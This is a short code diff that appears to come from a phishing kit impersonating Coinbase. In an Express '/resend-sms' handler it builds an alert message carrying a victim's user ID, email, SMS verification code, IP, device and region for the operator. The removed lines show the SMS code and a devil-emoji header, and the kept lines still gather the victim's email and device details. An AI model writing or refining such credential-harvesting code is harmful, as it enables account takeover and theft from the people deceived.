@@ -753,10 +753,9 @@ app.post("/resend-sms", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `😈😈😈 <b>Coinbase - SMS (Resend)</b> 😈😈😈\n` +
+      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
